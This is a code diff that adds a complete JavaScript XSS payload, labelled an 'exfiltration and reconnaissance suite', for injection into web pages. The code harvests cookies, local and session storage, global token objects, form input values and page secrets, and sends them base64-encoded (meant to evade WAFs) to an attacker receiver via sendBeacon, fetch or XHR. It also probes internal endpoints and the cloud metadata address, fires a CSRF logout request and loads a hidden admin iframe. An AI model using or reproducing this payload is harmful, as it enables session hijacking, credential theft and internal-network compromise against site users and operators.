@@ -1,3 +1,211 @@
+/**
+ * XSS Exfiltration & Reconnaissance Suite
+ * 
+ * Features:
+ * - Aggregated Reporting: Bundles synchronous data into a single request.
+ * - Resilience: Uses sendBeacon > fetch > xhr for reliable transmission.
+ * - Modular: Distinct phases for Recon, Scraper, and Active attacks.
+ * - Execution Safety: Robust error handling to prevent script termination.
+ */
+
+(function () {
+    'use strict';
+
+    // --- Configuration ---
+    const CONFIG = {
+        receiver: "http://192.168.1.221:8080", // Target Receiver
+        sessionId: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36),
+        aggressive: true, // Set to false to disable CSRF/modification attempts
+        probeTimeout: 2000 // Timeout for network probes
+    };
+
+    // --- Utilities ---
+    
+    /**
+     * Safely transmits data to the receiver.
+     * Prioritizes sendBeacon for reliability on page unload.
+     */
+    const exfiltrate = (data, endpoint = "/") => {
+        const payload = JSON.stringify({
+            session: CONFIG.sessionId,
+            timestamp: new Date().toISOString(),
+            url: location.href,
+            ...data
+        });
+
+        // Base64 encode the payload to bypass simple WAF JSON detection
+        const encoded = btoa(unescape(encodeURIComponent(payload)));
+        const targetUrl = `${CONFIG.receiver}${endpoint}`;
+
+        if (navigator.sendBeacon) {
+            // Send as Blob to ensure Content-Type is correct
+            const blob = new Blob([`data=${encoded}`], { type: 'application/x-www-form-urlencoded' });
+            navigator.sendBeacon(targetUrl, blob);
+        } else {
+            // Fallback for older browsers
+            try {
+                fetch(targetUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `data=${encoded}`,
+                    keepalive: true
+                }).catch(() => {});
+            } catch (e) {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', targetUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send(`data=${encoded}`);
+            }
+        }
+    };
+
+    /**
+     * Safe execution wrapper to prevent one module crashing the suite.
+     */
+    const tryExec = (fn, fallback = null) => {
+        try { return fn(); } catch (e) { return fallback; }
+    };
+
+    // --- Module: Reconnaissance (Synchronous) ---
+    // Collects environment data immediately.
+    
+    const gatherIntel = () => {
+        return {
+            cookies: document.cookie,
+            origin: location.origin,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            localStorage: tryExec(() => JSON.stringify(localStorage), "{}"),
+            sessionStorage: tryExec(() => JSON.stringify(sessionStorage), "{}"),
+            // Extract potential sensitive tokens from global scope
+            globalConfig: tryExec(() => {
+                const results = {};
+                for (const key of Object.keys(window)) {
+                    if (/config|user|token|api|key/i.test(key) && typeof window[key] === 'object') {
+                        results[key] = window[key];
+                    }
+                }
+                return results;
+            }, {})
+        };
+    };
+
+    // --- Module: Scraper (DOM & Content) ---
+    // Scrapes the visible page content.
+
+    const scrapeContent = () => {
+        return {
+            title: document.title,
+            // Grab the first 2KB of HTML structure
+            domStart: document.documentElement.outerHTML.slice(0, 2048),
+            // Extract all links
+            links: Array.from(document.links).map(l => l.href).slice(0, 50),
+            // Extract all scripts
+            scripts: Array.from(document.scripts).map(s => s.src || 'inline').slice(0, 50),
+            // Regex hunt for secrets in the body text
+            potentialSecrets: tryExec(() => {
+                const bodyText = document.body.innerText;
+                const regex = /(api[_-]?key|token|secret|password|auth)[^\s"']{0,40}/gi;
+                return (bodyText.match(regex) || []).slice(0, 10);
+            }, []),
+            // Input field values (if any)
+            inputs: Array.from(document.querySelectorAll('input, textarea')).map(i => ({name: i.name, value: i.value})),
+        };
+    };
+
+    // --- Module: Network Probes (Async) ---
+    // Scans internal network and attempts SSRF.
+
+    const probeNetwork = async () => {
+        const targets = [
+            "/api/internal/config",
+            "/admin",
+            "http://169.254.169.254/latest/meta-data/"
+        ];
+
+        targets.forEach(url => {
+            fetch(url, { signal: AbortSignal.timeout(CONFIG.probeTimeout) })
+                .then(r => r.text())
+                .then(text => exfiltrate({ 
+                    type: "probe_success", 
+                    target: url, 
+                    response: text.slice(0, 500) 
+                }))
+                .catch(e => { /* mute failures to reduce noise */ });
+        });
+    };
+
+    // --- Module: Active Actions ---
+    // CSRF and state modification. Only runs if aggressive mode is on.
+
+    const performActions = () => {
+        if (!CONFIG.aggressive) return;
+
+        // Example: Force image beacon (GET CSRF)
+        new Image().src = `${location.origin}/api/logout?csrf_bypass=1`;
+
+        // Example: Hidden Iframe loader
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = `${location.origin}/admin/settings`;
+        iframe.onload = () => {
+            try {
+                // Attempt to read iframe content (only works if same-origin)
+                const content = iframe.contentDocument.body.innerText;
+                exfiltrate({ type: "iframe_capture", content: content.slice(0, 500) });
+            } catch (e) { /* blocked by SOP */ }
+        };
+        document.body.appendChild(iframe);
+    };
+
+    // --- Main Execution Orchestrator ---
+
+    const main = () => {
+        // 1. Send initial beacon (Intel + Scrape)
+        const initialData = {
+            type: "initial_beacon",
+            ...gatherIntel(),
+            ...scrapeContent()
+        };
+        exfiltrate(initialData);
+
+        // 2. Setup Canvas Snapshot (Expensive operation)
+        tryExec(() => {
+            const canvas = document.querySelector('canvas');
+            if (canvas) {
+                exfiltrate({ 
+                    type: "canvas_snapshot", 
+                    data: canvas.toDataURL().slice(0, 5000) 
+                });
+            }
+        });
+
+        // 3. Start Async Network Probes
+        probeNetwork();
+
+        // 4. Run Active Attacks
+        performActions();
+
+        // 5. Setup Error Listener
+        window.addEventListener('error', (e) => {
+            exfiltrate({ type: "js_error", message: e.message, filename: e.filename });
+        });
+    };
+
+    // Delay execution slightly to ensure DOM is ready
+    if (document.readyState === 'complete') {
+        main();
+    } else {
+        window.addEventListener('load', main);
+    }
+
+})();
+
+//
+//
 
 // payloads__.js
 //
